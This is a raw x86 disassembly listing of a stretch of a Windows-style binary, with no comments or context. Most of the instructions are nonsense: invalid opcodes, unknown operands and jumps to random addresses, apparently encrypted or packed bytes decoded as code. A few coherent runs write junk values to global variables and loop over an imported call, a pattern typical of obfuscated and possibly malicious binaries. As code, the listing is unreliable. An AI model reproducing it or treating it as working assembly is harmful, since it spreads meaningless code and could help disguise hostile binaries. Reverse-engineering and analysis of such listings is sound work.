  40a587:	fucom  st(1)
  40a589:	xchg   edx,eax
  40a58a:	dec    ebx
  40a58b:	loopne 0x40a554
  40a58d:	mov    edi,0x6f17f743
  40a592:	mov    eax,ebx
  40a594:	jmp    DWORD PTR [esi]
  40a596:	sbb    ebx,DWORD PTR [ebx-0xb]
  40a599:	mov    DWORD PTR [ebp-0x2d78ecd9],0x1cb47bfe
  40a5a3:	stos   DWORD PTR es:[edi],eax
  40a5a4:	test   DWORD PTR [esi+edx*2-0x24],ebp
  40a5a8:	iret   
  40a5a9:	add    ch,bl
  40a5ab:	aam    0x87
  40a5ad:	and    DWORD PTR [ecx-0x65],ebp
  40a5b0:	imul   edi,edx,0x1
  40a5b3:	stos   BYTE PTR es:[edi],al
  40a5b4:	push   ss
  40a5b5:	mov    BYTE PTR [ecx+0x18e84903],ah
  40a5bb:	pop    ebx
  40a5bc:	ins    BYTE PTR es:[edi],dx
  40a5bd:	arpl   WORD PTR es:0x6bf7c606,ax
  40a5c4:	dec    eax
  40a5c5:	push   ecx
  40a5c6:	and    DWORD PTR [eax-0x6cf16337],eax
  40a5cc:	repz adc al,0xe9
  40a5cf:	stos   DWORD PTR es:[edi],eax
  40a5d0:	and    al,0xd7
  40a5d2:	popf   
  40a5d3:	es and al,0x63
  40a5d6:	cmp    al,0x80
  40a5d8:	adc    eax,0x2f1e34a5
  40a5dd:	push   es
  40a5de:	lods   eax,DWORD PTR ds:[esi]
  40a5df:	mov    DWORD PTR [esi+edx*8],edi
  40a5e2:	push   edx
  40a5e3:	sbb    BYTE PTR [edi],dl
  40a5e5:	push   es
  40a5e6:	push   ebx
  40a5e7:	add    bl,bl
  40a5e9:	mov    WORD PTR [bx+0xc32],?
  40a5ee:	lock mov al,ds:0xe56d8e7a
  40a5f4:	lds    eax,FWORD PTR [eax+edx*4+0x5b]
  40a5f8:	jmp    0xefb0c5c7
  40a5fd:	lods   eax,DWORD PTR ds:[esi]
  40a5fe:	mov    al,ds:0xccd3cbe8
  40a603:	data16 sbb ch,BYTE PTR [esi]
  40a606:	aaa    
  40a607:	ror    eax,cl
  40a609:	test   BYTE PTR [edx+0x56],al
  40a60c:	xor    DWORD PTR [ebp+0x5a],ebp
  40a60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a610:	or     eax,0x4fc37411
  40a615:	and    BYTE PTR [ebp+0x1bfe375c],bh
  40a61b:	inc    esi
  40a61c:	xor    DWORD PTR [eax],edi
  40a61e:	or     al,0xa8
  40a620:	or     DWORD PTR [ecx+eax*8+0x2b],edx
  40a624:	or     DWORD PTR cs:[esi+eax*8],0xc11cc956
  40a62c:	add    DWORD PTR [ecx-0x27195bfe],ecx
  40a632:	push   esi
  40a633:	jne    0x40a5ee
  40a635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a636:	imul   ebx,DWORD PTR [eax+0x50],0x85f6ebb9
  40a63d:	stc    
  40a63e:	sbb    eax,0xd16411e7
  40a643:	mov    bh,0x7e
  40a645:	mov    edi,0xd2299cb9
  40a64a:	and    ecx,esp
  40a64c:	stos   DWORD PTR es:[edi],eax
  40a64d:	cdq    
  40a64e:	sub    BYTE PTR [edi+0x78e00838],ch
  40a654:	ja     0x40a6c8
  40a656:	aad    0xf2
  40a658:	leave  
  40a659:	test   al,0x73
  40a65b:	push   eax
  40a65c:	xchg   edx,eax
  40a65d:	ins    DWORD PTR es:[edi],dx
  40a65e:	inc    esi
  40a65f:	ror    BYTE PTR [ebx],0xd4
  40a662:	repz test al,0xf
  40a665:	xchg   DWORD PTR [ebx+0x2c],ebx
  40a668:	adc    eax,0x94b276b6
  40a66d:	hlt    
  40a66e:	adc    dh,BYTE PTR es:0xdef66afc
  40a675:	ret    
  40a676:	test   BYTE PTR [esi+0x6b],0x58
  40a67a:	outs   dx,DWORD PTR ds:[esi]
  40a67b:	(bad)  
  40a67d:	in     eax,dx
  40a67e:	cmp    ebx,DWORD PTR [esp+ebp*8]
  40a681:	aas    
  40a682:	adc    edx,0xffffff94
  40a685:	mov    ecx,?
  40a687:	bound  ebp,QWORD PTR [edi+0x3]
  40a68a:	outs   dx,DWORD PTR ds:[esi]
  40a68b:	dec    ebx
  40a68c:	jl     0x40a6aa
  40a68e:	inc    ebp
  40a68f:	push   ebp
  40a690:	lock cmp al,0x53
  40a693:	mov    ah,BYTE PTR [eax+0x432e6342]
  40a699:	dec    ebx
  40a69a:	in     al,0x29
  40a69c:	lods   eax,DWORD PTR ds:[esi]
  40a69d:	enter  0xc391,0xa1
  40a6a1:	ror    edi,1
  40a6a3:	ins    BYTE PTR es:[edi],dx
  40a6a4:	lahf   
  40a6a5:	fidiv  WORD PTR [edi-0x67]
  40a6a8:	retf   0x5f23
  40a6ab:	(bad)  
  40a6ac:	pop    esp
  40a6ad:	jmp    0x2f2a:0xe0a0c8b9
  40a6b4:	add    BYTE PTR [ebx-0x56a8df6f],bl
  40a6ba:	lock int 0xb8
  40a6bd:	push   0x5160cab8
  40a6c2:	dec    eax
  40a6c3:	jmp    0x1545:0x33a49dc5
  40a6ca:	lods   eax,DWORD PTR ds:[esi]
  40a6cb:	inc    ebx
  40a6cc:	vpcmpgtw xmm6,xmm2,xmm3
  40a6d0:	push   edx
  40a6d1:	es dec edx
  40a6d3:	sbb    cl,bl
  40a6d5:	aas    
  40a6d6:	xchg   esp,eax
  40a6d7:	out    dx,al
  40a6d8:	lods   al,BYTE PTR ds:[esi]
  40a6d9:	push   0x72
  40a6db:	push   ss
  40a6dc:	xchg   BYTE PTR [esi-0x67],dl
  40a6df:	jnp    0x40a714
  40a6e1:	sbb    eax,0xb548da24
  40a6e6:	loope  0x40a6c4
  40a6e8:	pop    ebp
  40a6e9:	push   edx
  40a6ea:	xchg   BYTE PTR [ebx-0x21],dl
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x54c5ec0c
  40a7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7ad:	adc    DWORD PTR [esi],0xffffffed
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	ins    BYTE PTR es:[edi],dx
  40a7b7:	rol    ebp,cl
  40a7b9:	inc    edi
  40a7ba:	and    esp,DWORD PTR [edx+0x79a8059b]
  40a7c0:	pop    ebx
  40a7c1:	mov    ah,0xcf
  40a7c3:	dec    edx
  40a7c4:	ins    DWORD PTR es:[edi],dx
  40a7c5:	inc    esi
  40a7c6:	dec    ebp
  40a7c7:	imul   eax,DWORD PTR [ebx],0xd9621715
  40a7cd:	retf   0x94ff
  40a7d0:	mov    ecx,es
  40a7d2:	in     al,dx
  40a7d3:	cmovno ebx,DWORD PTR [edi]
  40a7d6:	add    BYTE PTR [edi+ecx*1],0x9
  40a7da:	or     al,dh
  40a7dc:	dec    ebp
  40a7dd:	lea    ecx,[edx+0x4e66e9f2]
  40a7e3:	inc    esp
  40a7e4:	in     al,dx
  40a7e5:	dec    ebx
  40a7e6:	mov    WORD PTR [edx+ecx*4],?
  40a7e9:	or     ebx,DWORD PTR [ebx-0x2b0aae76]
  40a7ef:	shl    DWORD PTR [edi+0x133abcb5],cl
  40a7f5:	sub    DWORD PTR [ebx+0x54],edx
  40a7f8:	mov    dl,0xbf
  40a7fa:	sub    al,0x29
  40a7fc:	call   0xf92849fe
  40a801:	fld    QWORD PTR [ecx]
  40a803:	aaa    
  40a804:	push   es
  40a805:	pop    eax
  40a806:	push   ebp
  40a807:	or     eax,DWORD PTR [ebx+esi*2-0xe]
  40a80b:	not    DWORD PTR [edi-0x7a]
  40a80e:	xchg   esp,eax
  40a80f:	xchg   DWORD PTR [edx+0x125b1d5c],edx
  40a815:	mov    ah,0xe3
  40a817:	or     bl,BYTE PTR ds:[ebx-0x27]
  40a81b:	jle    0x40a842
  40a81d:	(bad)  
  40a81e:	fstp   TBYTE PTR [esi+0x51]
  40a821:	js     0x40a8a1
  40a823:	jae    0x40a82d
  40a825:	add    al,0x7e
  40a827:	repz bound ebx,QWORD PTR [ecx+0x50]
  40a82b:	jmp    0xcd0fd722
  40a830:	adc    eax,0x9f773050
  40a835:	out    0x8b,al
  40a837:	(bad)  
  40a838:	mov    eax,ds:0xdc4346ee
  40a83d:	and    DWORD PTR [esi-0x2e498d57],eax
  40a843:	inc    ecx
  40a844:	mov    dl,0xa2
  40a846:	out    0xcd,eax
  40a848:	dec    ebp
  40a849:	stos   BYTE PTR es:[edi],al
  40a84a:	dec    eax
  40a84b:	dec    eax
  40a84c:	lods   eax,DWORD PTR ds:[esi]
  40a84d:	inc    ecx
  40a84e:	popa   
  40a84f:	out    dx,eax
  40a850:	mov    edx,0x7c933668
  40a855:	inc    edx
  40a856:	ins    BYTE PTR es:[edi],dx
  40a857:	mov    DWORD PTR [edx-0x2d],esi
  40a85a:	sbb    ecx,DWORD PTR [ecx+eax*4+0x30273ae3]
  40a861:	push   ebx
  40a862:	mov    cl,0xe4
  40a864:	test   BYTE PTR [ecx+0x20],0x1f
  40a868:	xor    eax,0xed3a6c74
  40a86d:	shr    BYTE PTR [eax+0x72],cl
  40a870:	cs mov bl,0x5e
  40a873:	xor    ebx,edi
  40a875:	ins    DWORD PTR es:[edi],dx
  40a876:	stos   DWORD PTR es:[edi],eax
  40a877:	jmp    0x15e784c2
  40a87c:	retf   
  40a87d:	sbb    ebx,DWORD PTR [eax-0x75]
  40a880:	dec    eax
  40a881:	jns    0x40a805
  40a883:	jae    0x40a8f8
  40a885:	xchg   ebp,eax
  40a886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a887:	inc    ecx
  40a888:	in     eax,dx
  40a889:	xlat   BYTE PTR ds:[ebx]
  40a88a:	mov    al,0x16
  40a88c:	jg     0x40a8bd
  40a88e:	in     al,dx
  40a88f:	adc    ecx,edx
  40a891:	test   BYTE PTR [ebp+0x78],bl
  40a894:	int3   
  40a895:	je     0x40a820
  40a897:	adc    bl,BYTE PTR [ecx+0x0]
  40a89a:	aam    0x38
  40a89c:	push   ss
  40a89d:	les    edx,FWORD PTR [ecx]
  40a89f:	sbb    DWORD PTR [ecx],esi
  40a8a1:	jl     0x40a865
  40a8a3:	in     eax,0x32
  40a8a5:	mov    bh,0x8f
  40a8a7:	xor    eax,0x78c980aa
  40a8ac:	mov    ?,WORD PTR [esi]
  40a8ae:	lock adc BYTE PTR [edx],dl
  40a8b1:	sub    DWORD PTR [edi],eax
  40a8b3:	jp     0x40a926
  40a8b5:	jae    0x40a891
  40a8b7:	das    
  40a8b8:	push   0x2
  40a8ba:	test   al,0x58
  40a8bc:	icebp  
  40a8bd:	shl    ecx,0x62
  40a8c0:	push   DWORD PTR [edi]
  40a8c2:	pop    edi
  40a8c3:	add    al,0x9a
  40a8c5:	sbb    DWORD PTR [esi+ecx*2+0x3f],esi
  40a8c9:	or     al,0x5b
  40a8cb:	aaa    
  40a8cc:	inc    eax
  40a8cd:	mov    ebp,0xec8b99ac
  40a8d2:	xlat   BYTE PTR ds:[ebx]
  40a8d3:	mov    cl,0x84
  40a8d5:	dec    esi
  40a8d6:	push   eax
  40a8d7:	jl     0x40a8a8
  40a8d9:	dec    ecx
  40a8da:	jmp    0xc9ac:0x88a51977
  40a8e1:	lea    edx,[ebx]
  40a8e3:	es pusha 
  40a8e5:	das    
  40a8e6:	sub    eax,0x29fe81b5
  40a8eb:	adc    ah,BYTE PTR [edx-0x3e5d07b9]
  40a8f1:	popf   
  40a8f2:	jo     0x40a956
  40a8f4:	popf   
  40a8f5:	adc    cl,BYTE PTR ds:0xc2ed284a
  40a8fb:	mov    WORD PTR [esi+0x48],ds
  40a8fe:	dec    eax
  40a8ff:	cs pushf 
  40a901:	ret    0xf020
  40a904:	ret    
  40a905:	mov    DWORD PTR [edi+0x7e],0xdad677c8
  40a90c:	push   edi
  40a90d:	sub    eax,0x2f0d9696
  40a912:	xchg   ecx,eax
  40a913:	mov    esi,0xc1a2136
  40a918:	call   0x1f9c:0xfb6eb216
  40a91f:	aam    0xbc
  40a921:	adc    eax,0xb5d8eb50
  40a926:	das    
  40a927:	add    eax,0xd2d31ec6
  40a92c:	iret   
  40a92d:	(bad)  
  40a92e:	adc    eax,0x74ff3870
  40a933:	push   edi
  40a934:	sub    DWORD PTR [ecx+0x1c8844d8],0xf7f4fc
  40a93e:	int3   
  40a93f:	push   edi
  40a940:	(bad)  
  40a941:	mov    ds:0xc737290e,al
  40a946:	std    
  40a947:	lock ins BYTE PTR es:[edi],dx
  40a949:	ret    0x18bd
  40a94c:	stos   BYTE PTR es:[edi],al
  40a94d:	sahf   
  40a94e:	into   
  40a94f:	arpl   WORD PTR [esi],cx
  40a951:	adc    al,BYTE PTR [eax]
  40a953:	retf   
  40a954:	in     eax,dx
  40a955:	aas    
  40a956:	adc    edi,edx
  40a958:	pop    esp
  40a959:	pop    ebp
  40a95a:	jg     0x40a9b9
  40a95c:	jmp    0x3d035fae
  40a961:	dec    esi
  40a962:	and    cl,dl
  40a964:	repnz lods eax,DWORD PTR ds:[esi]
  40a966:	xchg   esp,eax
  40a967:	dec    esi
  40a968:	jmp    0x9a65:0x7ddbdcf2
  40a96f:	(bad)  
  40a970:	adc    bl,BYTE PTR [esi]
  40a972:	xchg   BYTE PTR [eax-0x49],cl
  40a975:	jno    0x40a953
  40a977:	cld    
  40a978:	shl    al,0x6e
  40a97b:	lock dec BYTE PTR [ebx]
  40a97e:	sar    BYTE PTR [edx-0x5208e288],1
  40a984:	rol    dl,cl
  40a986:	mov    es,WORD PTR [edi+edx*4+0x27]
  40a98a:	sub    al,0x99
  40a98c:	mov    dh,0x51
  40a98e:	sub    ecx,DWORD PTR ds:0x8d1f5b36
  40a994:	or     eax,0x82e10478
  40a999:	add    bh,ah
  40a99b:	mov    ecx,0xee7c823d
  40a9a0:	aas    
  40a9a1:	out    0xbc,eax
  40a9a3:	mov    edi,0x5ab79d01
  40a9a8:	call   0x686e:0xf3837af8
  40a9af:	jecxz  0x40a95b
  40a9b1:	ins    DWORD PTR es:[edi],dx
  40a9b2:	add    eax,0x7e3ad2fd
  40a9b7:	popf   
  40a9b8:	(bad)  
  40a9b9:	or     esi,DWORD PTR [ecx+0x427a893a]
  40a9bf:	jmp    0x40a950
  40a9c1:	loope  0x40aa0b
  40a9c3:	cmp    al,ah
  40a9c5:	fwait
  40a9c6:	stos   BYTE PTR es:[edi],al
  40a9c7:	mov    esp,0xc61b16d4
  40a9cc:	aaa    
  40a9cd:	ds xchg esi,eax
  40a9cf:	jge    0x40aa49
  40a9d1:	scas   al,BYTE PTR es:[edi]
  40a9d2:	or     DWORD PTR [esi+edx*4+0x1b0ae4ab],ebp
  40a9d9:	loop   0x40a9d4
  40a9db:	sbb    edx,DWORD PTR [esi]
  40a9dd:	add    DWORD PTR [edi+0x1b8c0ccf],esp
  40a9e3:	cmp    cl,BYTE PTR [ecx]
  40a9e5:	addr16 iret 
  40a9e7:	inc    eax
  40a9e8:	mov    ecx,0x240a2f47
  40a9ed:	mov    esp,0xa3a5e51d
  40a9f2:	addr16 pop ss
  40a9f4:	cdq    
  40a9f5:	and    dh,bl
  40a9f7:	and    eax,0xcb699b82
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	hlt    
  40aa35:	jmp    0x7e7e:0xebd0977f
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	push   ebp
  40aa41:	shl    BYTE PTR [eax+0x74],1
  40aa44:	jae    0x40aab8
  40aa46:	mov    cl,0x33
  40aa48:	inc    ebp
  40aa49:	fadd   QWORD PTR [edx+ebx*2]
  40aa4c:	cld    
  40aa4d:	call   DWORD PTR [eax+ebx*8]
  40aa50:	inc    esp
  40aa51:	push   esp
  40aa52:	pop    ebx
  40aa53:	fwait
  40aa54:	out    0xb9,al
  40aa56:	jmp    0x403ac47a
  40aa5b:	jp     0x40aa57
  40aa5d:	shl    DWORD PTR [esi],1
  40aa5f:	mov    ebx,0xc650c7fd
  40aa64:	scas   al,BYTE PTR es:[edi]
  40aa65:	and    DWORD PTR [ebx],ebp
  40aa67:	sub    ah,BYTE PTR [edi-0x40]
  40aa6a:	mov    dh,0x21
  40aa6c:	pop    es
  40aa6d:	pop    edi
  40aa6e:	xchg   edx,eax
  40aa6f:	cmp    eax,0xf597d04
  40aa74:	(bad)  
  40aa75:	jmp    0x18fa:0x2edaa679
  40aa7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7d:	pop    dx
  40aa7f:	iret   
  40aa80:	push   0x5f
  40aa82:	std    
  40aa83:	cmp    ah,cl
  40aa85:	inc    ecx
  40aa86:	mov    dh,0x2f
  40aa88:	ret    
  40aa89:	ss cld 
  40aa8b:	xchg   ecx,eax
  40aa8c:	(bad)  
  40aa8d:	jge    0x40aa5e
  40aa8f:	adc    eax,DWORD PTR [edi]
  40aa91:	(bad)  
  40aa92:	loope  0x40aae0
  40aa94:	xor    eax,ecx
  40aa96:	add    ah,0xc
  40aa99:	out    0xdd,eax
  40aa9b:	repz pusha 
  40aa9d:	jg     0x40aa96
  40aa9f:	pushf  
  40aaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa1:	retf   0xbb58
  40aaa4:	clc    
  40aaa5:	fs inc edx
  40aaa7:	test   al,0xb8
  40aaa9:	adc    DWORD PTR [ecx-0x6b2eea1a],ebp
  40aaaf:	in     eax,dx
  40aab0:	out    dx,eax
  40aab1:	sub    eax,0xc4ab0b8d
  40aab6:	dec    edx
  40aab7:	jae    0x40ab25
  40aab9:	jb     0x40aac6
  40aabb:	mov    dl,0x39
  40aabd:	jns    0x40aa97
  40aabf:	xor    ebp,ecx
  40aac1:	mov    ch,0xc9
  40aac3:	xor    eax,0x88a528
  40aac8:	push   esi
  40aac9:	addr16 dec ecx
  40aacb:	out    0x62,al
  40aacd:	jae    0x40ab47
  40aacf:	call   0xeb13b7f5
  40aad4:	jecxz  0x40aa83
  40aad6:	pop    edx
  40aad7:	daa    
  40aad8:	jl     0x40aa88
  40aada:	xchg   esi,eax
  40aadb:	loope  0x40aaf5
  40aadd:	(bad)  
  40aade:	iret   
  40aadf:	sar    BYTE PTR [edx-0x1a],1
  40aae2:	test   BYTE PTR [ecx],dl
  40aae4:	and    eax,0xb029612a
  40aae9:	repnz aas 
  40aaeb:	ret    0x1f53
  40aaee:	push   edi
  40aaef:	inc    esi
  40aaf0:	bound  ebx,QWORD PTR [ecx]
  40aaf2:	das    
  40aaf3:	fstp   DWORD PTR [ebp-0x2d]
  40aaf6:	(bad)  
  40aaf7:	pop    ss
  40aaf8:	mov    ecx,0xeb012d81
  40aafd:	sub    edi,esi
  40aaff:	shl    ch,1
  40ab01:	ins    DWORD PTR es:[edi],dx
  40ab02:	repnz fisubr DWORD PTR [esi]
  40ab05:	adc    eax,0x1ef3ce44
  40ab0a:	imul   ecx,edx,0xcaf94ab4
  40ab10:	cmp    ebx,DWORD PTR [eax+0xadac12a]
  40ab16:	cdq    
  40ab17:	mul    BYTE PTR [esi-0x56]
  40ab1a:	or     edx,0x3a
  40ab1d:	mov    ah,0x9
  40ab1f:	sbb    eax,0x7b42b6eb
  40ab24:	sbb    al,ah
  40ab26:	inc    esi
  40ab27:	sbb    cl,BYTE PTR [ecx+0x5]
  40ab2a:	jnp    0x40aaeb
  40ab2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab2d:	test   BYTE PTR [edi+esi*4+0x32],bl
  40ab31:	and    dl,cl
  40ab33:	scas   eax,DWORD PTR es:[edi]
  40ab34:	sub    dh,BYTE PTR [eax]
  40ab36:	(bad)  
  40ab37:	xor    ecx,DWORD PTR [ecx-0x44]
  40ab3a:	loopne 0x40abb6
  40ab3c:	jp     0x40aaf6
  40ab3e:	imul   ebp,DWORD PTR [eax-0x51dd6b2c],0x4e
  40ab45:	pushf  
  40ab46:	(bad)  
  40ab47:	into   
  40ab48:	inc    ecx
  40ab49:	scas   al,BYTE PTR es:[edi]
  40ab4a:	push   ecx
  40ab4b:	inc    ebx
  40ab4c:	cmp    bl,ah
  40ab4e:	cmovb  edx,DWORD PTR [ecx-0x2]
  40ab52:	fsubr  st,st(3)
  40ab54:	imul   ebx,DWORD PTR [edi],0xffffff82
  40ab57:	jp     0x40aba2
  40ab59:	int3   
  40ab5a:	cmc    
  40ab5b:	test   ebx,0x49675d6a
  40ab61:	addr16 pusha 
  40ab63:	add    DWORD PTR [eax-0x7d],esi
  40ab66:	repnz mov esi,0x4b94bc85
  40ab6c:	into   
  40ab6d:	loope  0x40aaf0
  40ab6f:	jecxz  0x40ab8b
  40ab71:	cdq    
  40ab72:	and    edi,DWORD PTR [eax]
  40ab74:	cwde   
  40ab75:	cmc    
  40ab76:	inc    ebp
  40ab77:	icebp  
  40ab78:	call   FWORD PTR [ecx-0x76]
  40ab7b:	cli    
  40ab7c:	pop    esp
  40ab7d:	xchg   esi,eax
  40ab7e:	mov    edi,edx
  40ab80:	fs out dx,eax
  40ab82:	ds ret 
  40ab84:	mov    eax,ds:0x5fb58b97
  40ab89:	loopne 0x40aba9
  40ab8b:	fisubr WORD PTR [edx+0x2debad06]
  40ab91:	lds    esp,FWORD PTR [eax-0x44]
  40ab94:	mov    ebx,0xe641f9c9
  40ab99:	push   cs
  40ab9a:	jle    0x40ab5a
  40ab9c:	ds or  eax,0x8a8cd910
  40aba2:	mov    DWORD PTR [esi],ebp
  40aba4:	xchg   esp,eax
  40aba5:	cmp    ebp,esi
  40aba7:	mov    WORD PTR [edi+0x6fe60657],es
  40abad:	mov    bl,0x46
  40abaf:	cdq    
  40abb0:	cmp    bh,BYTE PTR [edi]
  40abb2:	mov    dl,0xe0
  40abb4:	jg     0x40abe3
  40abb6:	lahf   
  40abb7:	sbb    eax,0xe77fe312
  40abbc:	ja     0x40ac1d
  40abbe:	pop    edi
  40abbf:	mov    bl,0xc6
  40abc1:	add    eax,0x2c3ac5fb
  40abc6:	bound  esp,QWORD PTR [eax-0x9]
  40abc9:	mov    dl,0xdf
  40abcb:	repz loope 0x40ac3c
  40abce:	ja     0x40abbc
  40abd0:	ficom  WORD PTR [ebx]
  40abd2:	jle    0x40abc4
  40abd4:	jmp    0xd83095fd
  40abd9:	mov    ebx,0x748aa605
  40abde:	mov    esi,fs
  40abe0:	fadd   DWORD PTR [edi+0x3efefc60]
  40abe6:	xor    eax,0x80c7e2fb
  40abeb:	cwde   
  40abec:	ror    DWORD PTR [edi],1
  40abee:	adc    esi,DWORD PTR [edi]
  40abf0:	xor    eax,edx
  40abf2:	in     al,dx
  40abf3:	out    0x54,eax
  40abf5:	shr    edx,1
  40abf7:	add    al,0x50
  40abf9:	cmp    ebp,DWORD PTR [edi+0x5f]
  40abfc:	cld    
  40abfd:	aam    0xf1
  40abff:	fild   WORD PTR [bp+si-0x24a4]
  40ac04:	mov    ?,WORD PTR ds:0x13e6b2ee
  40ac0a:	inc    ebp
  40ac0b:	mov    edx,0xda4cfcc7
  40ac10:	scas   al,BYTE PTR es:[di]
  40ac12:	sti    
  40ac13:	mov    WORD PTR [edx-0x711a427],ss
  40ac19:	ins    DWORD PTR es:[edi],dx
  40ac1a:	xor    esp,edx
  40ac1c:	jo     0x40ac5e
  40ac1e:	adc    DWORD PTR [ebx-0x54],edi
  40ac21:	jne    0x40ac3a
  40ac23:	mov    edi,0xfffa8bb2
  40ac28:	lods   al,BYTE PTR ds:[esi]
  40ac29:	xor    eax,0x6e3c9dc9
  40ac2e:	call   0x1769:0xa3e14f2d
  40ac35:	mov    eax,ds:0x9e54d885
  40ac3a:	sub    ch,BYTE PTR [ecx+0x3eacf108]
  40ac40:	push   edi
  40ac41:	pushf  
  40ac42:	xor    al,BYTE PTR [edi+0x4b2654eb]
  40ac48:	xor    al,dh
  40ac4a:	into   
  40ac4b:	sti    
  40ac4c:	lea    ebx,[ebx+ecx*4+0x4a148201]
  40ac53:	hlt    
  40ac54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac55:	arpl   WORD PTR [ebx-0x2bed8168],dx
  40ac5b:	push   edi
  40ac5c:	(bad)  [edi-0x134bdfbb]
  40ac62:	scas   eax,DWORD PTR es:[edi]
  40ac63:	in     al,0xef
  40ac65:	jmp    0x72c1ccde
  40ac6a:	inc    eax
  40ac6b:	lods   eax,DWORD PTR ds:[esi]
  40ac6c:	ret    
  40ac6d:	loop   0x40ac14
  40ac6f:	repz and DWORD PTR [ebx],eax
  40ac72:	and    esi,DWORD PTR [edx-0x6d]
  40ac75:	sub    eax,0x4ba0e13a
  40ac7a:	jge    0x40acc4
  40ac7c:	std    
  40ac7d:	xchg   ebp,eax
  40ac7e:	xchg   ebx,eax
  40ac7f:	jmp    0x40aced
  40ac81:	inc    ecx
  40ac82:	shl    BYTE PTR [eax-0x37c4a337],0xf
  40ac89:	test   BYTE PTR [edi+0xd],bl
  40ac8c:	add    BYTE PTR [eax],al
  40ac8e:	sbb    DWORD PTR ds:0x43376b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4337ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0xb4f6783],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad6d
  40ad2c:	push   edi
  40ad2d:	sub    edi,ebp
  40ad2f:	adc    eax,0x5c7f8bb1
  40ad34:	enter  0xaf90,0xda
  40ad38:	add    eax,0x65d6d9db
  40ad3d:	cmovs  ebp,DWORD PTR [ecx+ecx*2]
  40ad41:	outs   dx,DWORD PTR ds:[esi]
  40ad42:	mov    esp,edx
  40ad44:	mov    BYTE PTR [ebp-0x4786429f],ah
  40ad4a:	add    al,dl
  40ad4c:	xor    ch,BYTE PTR [edx]
  40ad4e:	repnz imul edx,DWORD PTR [esi],0x3b
  40ad52:	jmp    0x40adbd
  40ad54:	mov    WORD PTR [ebx-0x684c4032],ss
  40ad5a:	mov    eax,0xccbf9468
  40ad5f:	xor    ah,dl
  40ad61:	enter  0xe763,0x1c
  40ad65:	sub    edx,esi
  40ad67:	call   DWORD PTR [eax-0x77]
  40ad6a:	ins    DWORD PTR es:[edi],dx
  40ad6b:	push   esi
  40ad6c:	shl    BYTE PTR [esi+0x55],cl
  40ad6f:	or     DWORD PTR [edx+0x4c],eax
  40ad72:	test   edx,ebx
